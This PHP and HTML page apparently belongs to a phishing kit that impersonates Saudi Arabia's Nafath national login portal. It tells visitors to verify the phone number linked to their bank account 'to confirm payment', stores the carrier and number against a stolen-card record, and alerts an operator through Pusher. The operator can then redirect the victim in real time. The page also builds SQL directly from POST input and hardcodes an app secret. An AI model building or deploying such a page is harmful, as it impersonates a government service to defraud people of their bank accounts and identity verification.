<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);
########################
require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'شركات الهاتف');

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $dataa = [
        'userId' => $_SESSION['user_id'],
        'page' => 'شركات الهاتف'
    ];

    $pusher->trigger('temaeen-new', 'curreneft-page', $dataa);
}


if (isset($_POST['submit'])) {

    //print_r($_POST);
    $CompanyName = $_POST['CompanyName'];
    $PhoneNumber = $_POST['PhoneNumber'];
    $X = 0;

    include("DB_CON.php");

    $q = "UPDATE card SET company='$CompanyName', PhoneNumber='$PhoneNumber', CheckTheInfo_Nafad='$X' WHERE id =" . $_SESSION['card_id'] . ";";

    $v = mysqli_query($con, $q);

    if ($v) {
        mysqli_close($con);

        $site = array(
            'message' => 'رقم هاتف نفاذ',
            'type' => '3'
        );

        $userId = $_SESSION['user_id'];
        $User->UpdateStatus($userId,  'رقم هاتف نفاذ');

        $data = [
            'userId' => $userId,
            'updatedData' => $site
        ];

        $pusher->trigger('temaeen-new', 'update-user-accountt', $data);

        $_SESSION['CompanyName'] = $CompanyName;

        SendDynamic('رقم هاتف نفاذ', $PhoneNumber);

        echo "<script>document.location.href='wait-nafath.php';</script>";
    }
}
?>


<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

<head id="j_idt2">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <!--<meta http-equiv="X-UA-Compatible" content="IE=edge">-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- CSS only -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300&display=swap" rel="stylesheet">
    <link rel="icon" sizes="192x192" href="https://new-smmacsoo.com/resources/./assets/pfavico.ico">
    <link rel="shortcut icon" href="https://new-smmacsoo.com/resources/./assets/pfavico.ico" type="image/x-icon">
    <link rel="apple-touch-icon" href="https://new-smmacsoo.com/resources/./assets/pfavico.ico" type="image/x-icon">
    <title>NAFAD</title>
    <style>
        nav {
            overflow: auto;
        }

        .nafad {
            margin-right: 222px;
            float: right;
        }

        .rr ul {
            list-style-type: none;
            margin-top: -90px;
        }

        .rr ul li {
            display: inline-block;
            color: #11998E;
        }

        .rr ul li:nth-child(2) {
            margin-left: 82px;
            margin-right: 72px;
        }

        .rr ul li:nth-child(1) {
            margin-left: -11px;
        }

        a {
            text-decoration: none;
        }

        .ff ul {
            list-style-type: none;
        }

        .ff ul li {
            display: inline;
            padding: 10px;
            font-weight: bold;
        }

        @media only screen and (max-width: 600px) {
            nav {
                overflow: hidden;
            }

            .nafad {
                float: none;
                margin-left: 230px;
            }
        }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
</head>

<body class="bg-light" style="font-family:'Tajawal', sans-serif; overflow-x: hidden;">




    <header class="shadow-sm" style=" background-color: white;">
        <nav>
            <img src="./assets/nafad.png" class="nafad my-4" />
        </nav>
    </header>

    <main>
        <div class="container-fluid bg-light">
            <div class="row">
                <div class="col-sm-12 text-center rr mt-4">
                    <!-- <img src="./assets/point.png" class="mt-4"> -->
                    <!-- <ul class="fw-bold">
                        <li>إنهاء</li>
                        <li>توثيق رقم الجوال</li>
                        <li>المصادقة</li>
                    </ul> -->
                    <!-- <h3 class="text-center mt-5" style="font-weight: bold;">توثيق رقم الجوال</h3> -->
                </div>
            </div>
            <div class="row d-flex justify-content-center my-5">
                <div class="col-sm-6">
                    <h4 class="text-center" style="font-weight: bold;">يرجى توثيق رقم الجوال المرتبط بالحساب البنكي للتأكيد على عملية السداد</h4>
                </div>
            </div>
        </div>
        <div class="container-fluid bg-light" style="margin-bottom: 100px;">
            <div class="container-fluid bg-light" style="margin-bottom: 100px;">
                <form action="" method="POST">
                    <select name="CompanyName" class="form-select" id="" required>
                        <option value="">مشغل الشبكة</option>
                        <option value="mobily">mobily</option>
                        <option value="zain">zain</option>
                        <option value="Virqin">Virqin</option>
                        <option value="Stc">Stc</option>
                        <option value="lebra">lebra</option>
                    </select>

                    <input type="text" name="PhoneNumber" id="phone" minlength="10" maxlength="10" inputmode="numeric" required pattern="05\d{8}" class="form-control mt-3" placeholder="رقم الجوال">

                    <button type="submit" name="submit" class="tawtheg w-100 text-center btn fw-bold mt-4" style="background-color:#11998E; color: white; letter-spacing: 1px;">توثيق</button>
                </form>
            </div>
        </div>
    </main>

    <footer>
        <div class="container rounded" style="background-color: #dddddd; overflow: hidden;">
            <div class="row d-flex align-items-center pt-3">

                <div class="col-sm-3 col-lg-3 mt-4">
                    <p class="fw-bold text-end">تطوير وتشغيل</p>
                    <h2 class="fw-bold text-end">مركز المعلومات الوطني</h2>
                    <p class="fw-bold text-end">النفاذ الوطني الموحد جميع الحقوق محفوظة © 2022</p>
                </div>
                <div class="col-sm-3 col-lg-3 text-center">
                    <img src="./assets/NIC.png">
                </div>
            </div>
        </div>
    </footer>
    <script src="js/main.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;

        Pusher.logToConsole = true;

        var pusher = new Pusher('4a9de0023f3255d461d9', {
            cluster: 'ap2'
        });

        var channel = pusher.subscribe('my-channel-new-jaz');

        channel.bind('page-tamen-new', function(data) {

            if (data.userId === userIdFromSession) {
                document.location.href = data.page;
            }

        });
    </script>
</body>

</html>